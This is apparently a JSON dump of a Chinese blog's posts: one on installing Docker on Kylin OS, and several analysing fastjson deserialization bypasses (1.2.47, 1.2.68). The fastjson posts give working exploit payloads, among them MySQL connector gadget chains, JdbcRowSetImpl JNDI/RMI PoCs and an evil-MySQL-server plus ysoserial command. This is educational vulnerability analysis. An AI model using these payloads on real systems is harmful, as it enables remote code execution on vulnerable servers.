[{"content":" 银河麒麟高级服务器操作系统 V10 是针对企业级关键业务，适应虚拟化、 云计算、大数据、工业互联网时代对主机系统可靠性、安全性、性能、扩展性和 实时性的需求，依据 CMMI 5 级标准研制的提供内生安全、云原生支持、国产 平台深入优化、高性能、易管理的新一代自主服务器操作系统；同源支持飞腾、 龙芯、申威、兆芯、海光、鲲鹏等自主平台；可支撑构建大型数据中心服务器高 可用集群、负载均衡集群、分布式集群文件系统、虚拟化应用和容器云平台等， 可部署在物理服务器和虚拟化环境、私有云、公有云和混合云环境；应用于政府、 国防、金融、教育、财税、公安、审计、交通、医疗、制造等领域。\n 公司有个项目需要将系统部署在 kylinos上，刚开始还有点头疼，害怕各种程序无法安装和使用，等安装好服务器进行使用的时候发现这不就是基于centos的嘛，虽然基于哪个版本不知道，但是可以测试的，于是我一顿操作，最后发现它是基于Centos8的，系统内核版本是 4.19，问题不大，既然是基于Centos8的，那Centos8上能跑的程序，在这肯定也能跑，然后我就开始了愉快（痛苦）的安装docker之旅了。\n配置阿里云Centos8镜像源 之所以要配置 Centos8 的镜像源是因为在安装docker的时候需要额外的一些依赖，而这些依赖在麒麟官方的源里面是没有的。\ncurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo 配置阿里云 docker 镜像源 yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i \u0026#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+\u0026#39; /etc/yum.repos.d/docker-ce.repo 定义 yum 变量\u0026amp;修改 repo 修改 centos 和 docker repo文件中的 $releasever 为 centos_version ，原因是在麒麟服务器操作系统V10中 $releasever被修改为了 10，而我们需要使用 centos 8的镜像源，如果你不替换，基本上仓库的每一个地址都是404。\necho \u0026#34;8\u0026#34; \u0026gt; /etc/yum/vars/centos_version sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/docker-ce.repo sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/CentOS-Base.repo 建立yum缓存 没啥可说的\nyum makecache 查看docker-ce 版本 yum list docker-ce --showduplicates | sort -r docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable 安装docker 这里要安装 docker-ce 19.03 版本，因为我在使用最新版 20.10 启动容器时出现了未知的权限问题，而麒麟服务器操作系统资料相对较少，我未能找到相应的解决方案，只好退而求其次，换到上一个稳定版本。\n20.10 版本错误信息如下：\ndocker: Error response from daemon: OCI runtime create failed: container_linux.go:318: starting container process caused \u0026#34;permission denied\u0026#34;: unknown. ERRO[0000] error waiting for container: context canceled 还是安装 19.03 版本吧。\nyum install docker-ce-19.03.15 docker-ce-cli-19.03.15 containerd.io -y 启动docker systemctl start docker systemctl enable docker 启动 hello-world 进行测试 root@localhost ~]# docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world 2db29710123e: Pull complete Digest: sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ 完美使用 -:)\n","permalink":"https://typesafe.cn/posts/install-docker-on-kylinos/","summary":"银河麒麟高级服务器操作系统 V10 是针对企业级关键业务，适应虚拟化、 云计算、大数据、工业互联网时代对主机系统可靠性、安全性、性能、扩展性和 实时性的需求，依据 CMMI 5 级标准研制的提供内生安全、云原生支持、国产 平台深入优化、高性能、易管理的新一代自主服务器操作系统；同源支持飞腾、 龙芯、申威、兆芯、海光、鲲鹏等自主平台；可支撑构建大型数据中心服务器高 可用集群、负载均衡集群、分布式集群文件系统、虚拟化应用和容器云平台等， 可部署在物理服务器和虚拟化环境、私有云、公有云和混合云环境；应用于政府、 国防、金融、教育、财税、公安、审计、交通、医疗、制造等领域。\n 公司有个项目需要将系统部署在 kylinos上，刚开始还有点头疼，害怕各种程序无法安装和使用，等安装好服务器进行使用的时候发现这不就是基于centos的嘛，虽然基于哪个版本不知道，但是可以测试的，于是我一顿操作，最后发现它是基于Centos8的，系统内核版本是 4.19，问题不大，既然是基于Centos8的，那Centos8上能跑的程序，在这肯定也能跑，然后我就开始了愉快（痛苦）的安装docker之旅了。\n配置阿里云Centos8镜像源 之所以要配置 Centos8 的镜像源是因为在安装docker的时候需要额外的一些依赖，而这些依赖在麒麟官方的源里面是没有的。\ncurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo 配置阿里云 docker 镜像源 yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i \u0026#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+\u0026#39; /etc/yum.repos.d/docker-ce.repo 定义 yum 变量\u0026amp;修改 repo 修改 centos 和 docker repo文件中的 $releasever 为 centos_version ，原因是在麒麟服务器操作系统V10中 $releasever被修改为了 10，而我们需要使用 centos 8的镜像源，如果你不替换，基本上仓库的每一个地址都是404。\necho \u0026#34;8\u0026#34; \u0026gt; /etc/yum/vars/centos_version sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/docker-ce.repo sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/CentOS-Base.repo 建立yum缓存 没啥可说的\nyum makecache 查看docker-ce 版本 yum list docker-ce --showduplicates | sort -r docker-ce.","title":"在银河麒麟高级服务器操作系统V10上安装docker"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson \u0026lt;= 1.2.68 expectClass 绕过原理 当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。\nfastjson 1.2.68 在进行反序列化的时候，会进入 ObjectDeserializer 的 deserialze 方法，而 安全人员发现 当 @type 为 java.lang.AutoCloseable 的时候会找到实现类 JavaBeanDeserializer 调用 deserialze，而 JavaBeanDeserializer 的 deserialze 方法还会继续解析得到第二个 @type 对应的值进行反序列化，并且 expectClass 则不再是 null 值，而是 java.lang.AutoCloseable。\nJavaBeanDeserializer 的 deserialze 部分代码示例。\nif (lexer.token() == JSONToken.LITERAL_STRING) { // 第二个 @type 的值 String typeName = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) { if (lexer.token() == JSONToken.RBRACE) { lexer.nextToken(); break; } continue; } // 这里没有获取到 deserializer ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName); Class\u0026lt;?\u0026gt; userType = null; if (deserializer == null) { // 第一个 @type 的值 Class\u0026lt;?\u0026gt; expectClass = TypeUtils.getClass(type); // 在包含 expectClass 时会绕过 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures()); deserializer = parser.getConfig().getDeserializer(userType); } // 再次进行反序列化，会触发反射构造实例 Object typedObject = deserializer.deserialze(parser, userType, fieldName); if (deserializer instanceof JavaBeanDeserializer) { JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer; if (typeKey != null) { FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey); if (typeKeyFieldDeser != null) { typeKeyFieldDeser.setValue(typedObject, typeName); } } } return (T) typedObject; } ParseConfig 的 checkAutoType 部分代码示例，只要第二个 @type 继承了 第一个 @type 即可触发。\nif (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { TypeUtils.addMapping(typeName, clazz); return clazz; } else { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } } Fastjson \u0026lt;= 1.2.68 利用链 在 black hat usa 2021 议题上，腾讯玄武实验室披露了四条利用链，分别是：\n Mysql connector RCE Apache commons io read and write files Jetty SSRF Apache xbean-reflect RCE  其中 Mysql 的利用链是因为可以构造任意 URL 使用 JDBC 连接，连接至恶意 Mysql 服务器，服务器返回的内容被 JDBC 反序列化。\nMysql connector 5.1.x\n{ \u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;com.mysql.jdbc.JDBC4Connection\u0026#34;, \u0026#34;hostToConnectTo\u0026#34;: \u0026#34;mysql.host\u0026#34;, \u0026#34;portToConnectTo\u0026#34;: 3306, \u0026#34;info\u0026#34;: { \u0026#34;user\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;, \u0026#34;statementInterceptors\u0026#34;: \u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;, \u0026#34;autoDeserialize\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;NUM_HOSTS\u0026#34;: \u0026#34;1\u0026#34; }, \u0026#34;databaseToConnectTo\u0026#34;: \u0026#34;dbname\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;\u0026#34; } • Mysql connector 6.0.2 or 6.0.3\n{ \u0026quot;@type\u0026quot;: \u0026quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\u0026quot;, \u0026quot;proxy\u0026quot;: { \u0026quot;connectionString\u0026quot;: { \u0026quot;url\u0026quot;: \u0026quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\u0026quot; } } } • Mysql connector 6.x or \u0026lt; 8.0.20\n{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\u0026#34;, \u0026#34;proxy\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\u0026#34;, \u0026#34;connectionUrl\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.conf.url.ReplicationConnectionUrl\u0026#34;, \u0026#34;masters\u0026#34;:[ { \u0026#34;host\u0026#34;:\u0026#34;mysql.host\u0026#34; } ], \u0026#34;slaves\u0026#34;:[ ], \u0026#34;properties\u0026#34;:{ \u0026#34;host\u0026#34;:\u0026#34;mysql.host\u0026#34;, \u0026#34;user\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;dbname\u0026#34;:\u0026#34;dbname\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;pass\u0026#34;, \u0026#34;queryInterceptors\u0026#34;:\u0026#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;, \u0026#34;autoDeserialize\u0026#34;:\u0026#34;true\u0026#34; } } } } JDBC 利用链原理 我们先来看一段每一个Java 开发都要学习的 JDBC 操作数据库的示例：\nimport java.sql.*; public class MySQLDemo { static final String JDBC_DRIVER = \u0026#34;com.mysql.jdbc.Driver\u0026#34;; static final String DB_URL = \u0026#34;jdbc:mysql://localhost:3306/test\u0026#34;; static final String USERNAME = \u0026#34;root\u0026#34;; static final String PASSWORD = \u0026#34;123456\u0026#34;; public static void main(String[] args) { Connection conn = null; Statement stmt = null; try { // 注册 JDBC 驱动  Class.forName(JDBC_DRIVER); // 打开链接  System.out.println(\u0026#34;连接数据库...\u0026#34;); conn = DriverManager.getConnection(DB_URL, USERNAME, PASSWORD); // 执行查询  System.out.println(\u0026#34; 实例化Statement对象...\u0026#34;); stmt = conn.createStatement(); String sql; sql = \u0026#34;SELECT * FROM test\u0026#34;; ResultSet rs = stmt.executeQuery(sql); int index = 0; // 展开结果集数据库  while (rs.next()) { // getObject 会根据字段不同的类型做不同的处理  Object object = rs.getObject(index); System.out.println(object); index++; } // 完成后关闭  rs.close(); } catch (Exception se) { se.printStackTrace(); } finally { // 关闭资源  try { if (stmt != null) stmt.close(); } catch (SQLException ignored) { } try { if (conn != null) conn.close(); } catch (SQLException ignored) { } } System.out.println(\u0026#34;Goodbye!\u0026#34;); } } 其中 ResultSetImpl 的 getObject 方法会根据Mysql中字段的类型做不同的处理，源码如下：\n@Override public Object getObject(int columnIndex) throws SQLException { checkRowPos(); checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; // we can\u0026#39;t completely rely on code below because primitives have default values for null (e.g. int-\u0026gt;0)  if (this.thisRow.getNull(columnIndexMinusOne)) { return null; } Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) { case BIT: // TODO Field sets binary and blob flags if the length of BIT field is \u0026gt; 1; is it needed at all?  if (field.isBinary() || field.isBlob()) { byte[] data = getBytes(columnIndex); if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object?  try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + cnfe.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); } catch (IOException ex) { obj = data; // not serialized?  } } else { return getString(columnIndex); } } return obj; } return data; } return field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex); // 代码省略  case BINARY: case VARBINARY: case TINYBLOB: case MEDIUMBLOB: case LONGBLOB: case BLOB: if (field.isBinary() || field.isBlob()) { byte[] data = getBytes(columnIndex); if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object?  try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + cnfe.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); } catch (IOException ex) { obj = data; // not serialized?  } } else { return getString(columnIndex); } } return obj; } return data; } return getBytes(columnIndex); // 代码省略  } } 可以看到在处理“大字符串”时会进行反序列化，当 JDBC 首次连接MySQL服务器时，会主动使用sql查询（不同版本的JDBC查询的内容略有不同），恶意Mysql服务器即可返回我们构造好的恶意数据，最后就可以触发任意命令执行。\n恶意MySQL服务可以使用 python3实现的 https://github.com/fnmsd/MySQL_Fake_Server\n也可以使用我参考 MySQL_Fake_Server 后用 Go 实现的 https://github.com/dushixiang/evil-mysql-server\n以 mysql-connector-java 5.1.11 为例，先启动恶意Mysql 服务端。\n 这里没有使用自己构造恶意数据，而是使用了一个开源的 Java 反序列化工具 ysoserial\n ./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar 测试代码  需要pom依赖中存在 commons-collections 3.1\n import com.alibaba.fastjson.JSON; public class Evil6 { public static void main(String[] args) { // 5.1.11-5.1.48(反序列化链)  String json = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;java.lang.AutoCloseable\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.mysql.jdbc.JDBC4Connection\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;hostToConnectTo\\\u0026#34;: \\\u0026#34;127.0.0.1\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;portToConnectTo\\\u0026#34;: 3306,\\n\u0026#34; + \u0026#34; \\\u0026#34;info\\\u0026#34;: {\\n\u0026#34; + \u0026#34; \\\u0026#34;user\\\u0026#34;: \\\u0026#34;yso_CommonsCollections5_calc\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;password\\\u0026#34;: \\\u0026#34;pass\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;statementInterceptors\\\u0026#34;: \\\u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;autoDeserialize\\\u0026#34;: \\\u0026#34;true\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;NUM_HOSTS\\\u0026#34;: \\\u0026#34;1\\\u0026#34;\\n\u0026#34; + \u0026#34; },\\n\u0026#34; + \u0026#34; \\\u0026#34;databaseToConnectTo\\\u0026#34;: \\\u0026#34;dbname\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;url\\\u0026#34;: \\\u0026#34;\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; JSON.parseObject(json); } } 运行之后便可以看到本机打开了计算器，其他版本的 mysql-connector-java 也类似，可以自行挖掘更多利用链。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk java 1.8.0_301 fastjson 1.2.68 commons-collections 3.1 ysoserial 0.0.6-SNAPSHOT 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  参考  https://www.buaq.net/go-82366.html  ","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-6/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson \u0026lt;= 1.2.68 expectClass 绕过原理 当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。\nfastjson 1.2.68 在进行反序列化的时候，会进入 ObjectDeserializer 的 deserialze 方法，而 安全人员发现 当 @type 为 java.lang.AutoCloseable 的时候会找到实现类 JavaBeanDeserializer 调用 deserialze，而 JavaBeanDeserializer 的 deserialze 方法还会继续解析得到第二个 @type 对应的值进行反序列化，并且 expectClass 则不再是 null 值，而是 java.lang.AutoCloseable。\nJavaBeanDeserializer 的 deserialze 部分代码示例。\nif (lexer.token() == JSONToken.LITERAL_STRING) { // 第二个 @type 的值 String typeName = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) { if (lexer.token() == JSONToken.RBRACE) { lexer.nextToken(); break; } continue; } // 这里没有获取到 deserializer ObjectDeserializer deserializer = getSeeAlso(config, this.","title":"Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson \u0026lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。\n我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。\nimport com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：\nautoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。\n下面我们使用新的 POC 进行测试，又可以利用成功了。\nimport com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;a\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;b\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}}\u0026#34;; JSON.parse(payload); } } payload 格式化之后如下：\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://localhost:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } Fastjson \u0026lt;= 1.2.47 绕过原理 在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。\n上面我们已经发现用上一节构造的 payload 已经无法通过，就是因为在调用 ParserConfig.checkAutoType 返回的。\n安全人员通过审计源码发现，当JSON对象的类型是java.lang.Class，并且存在 val 字段时，fastjson 会将其解析转换得到字符串（完整包名），并将 val 对应的类加载到缓存中，而 checkAutoType 方法中，如果从缓存中获取到了 Class 就会直接返回，不会再进行下面的黑名单校验。\n以我们构造的 payload 为例，首先会解析\n{ \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; } 因为 @type 是 java.lang.Class 所以通过了 checkAutoType 校验，进入 com.alibaba.fastjson.serializer.MiscCodec 的 deserialze 方法，下面是 deserialze 方法的部分代码。\npublic \u0026lt;T\u0026gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) { JSONLexer lexer = parser.lexer; // 代码省略  Object objVal; if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) { parser.resolveStatus = DefaultJSONParser.NONE; parser.accept(JSONToken.COMMA); if (lexer.token() == JSONToken.LITERAL_STRING) { if (!\u0026#34;val\u0026#34;.equals(lexer.stringVal())) { throw new JSONException(\u0026#34;syntax error\u0026#34;); } lexer.nextToken(); } else { throw new JSONException(\u0026#34;syntax error\u0026#34;); } parser.accept(JSONToken.COLON); // 解析 val 字段  objVal = parser.parse(); parser.accept(JSONToken.RBRACE); } else { objVal = parser.parse(); } String strVal; if (objVal == null) { strVal = null; } else if (objVal instanceof String) { // 转换为 String 类型  strVal = (String) objVal; } else { // 代码忽略  } // 代码省略  // 这个 clazz 是我们在 @type 中指定的类型，因此是满足这个条件的  if (clazz == Class.class) { return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader()); } // 代码省略 } 而 com.alibaba.fastjson.util.TypeUtils.java 最终调用的方法如下：\npublic static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader) { return loadClass(className, classLoader, true); } 可以看到 cache 参数是 true。\npublic static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) { // 代码忽略 try{ if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { // 这里缓存了 com.sun.rowset.JdbcRowSetImpl 到 mappings 中 mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026amp;\u0026amp; contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { // 这里缓存了 com.sun.rowset.JdbcRowSetImpl 到 mappings 中 mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } 解析完第一个JSON对象后，开始解析第二个JSON对象。\n{ \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://localhost:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } 我们直接看 com.alibaba.fastjson.parser.ParseConfig.checkAutoType 的代码:\npublic Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { // 代码忽略 ... if (clazz == null) { // 这里从 mapping 中通过类名称获取类，因为在处理第一个JSON对象的时候已经把 com.sun.rowset.JdbcRowSetImpl put 进去了，因此这里一定是可以获取到 Class 的 clazz = TypeUtils.getClassFromMapping(typeName); } // 不会进入这个判断 if (clazz == null) { clazz = deserializers.findClass(typeName); } // 进入这个判断 if (clazz != null) { // 根据参数调用得出 expectClass 是 null，也不会进入这个判断 if (expectClass != null \u0026amp;\u0026amp; clazz != java.util.HashMap.class \u0026amp;\u0026amp; !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026quot;type not match. \u0026quot; + typeName + \u0026quot; -\u0026gt; \u0026quot; + expectClass.getName()); } // 直接返回 Class return clazz; } // 代码省略，下面的黑名单判断已经不重要了 return clazz; } 可以看到在缓存中获取到 Class 对象后直接 return 出去了，下面的黑名单校验并没有进行，之后的逻辑就是构造实例，发出 JNDI 请求，在此不再赘述了。\n","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-5/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson \u0026lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。\n我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。\nimport com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：\nautoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。\n下面我们使用新的 POC 进行测试，又可以利用成功了。\nimport com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;a\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;b\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}}\u0026#34;; JSON.parse(payload); } } payload 格式化之后如下：","title":"Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nJNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。\nJNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。\n 轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS)  这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。\n使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。\n// 创建一个上下文对象 InitialContext 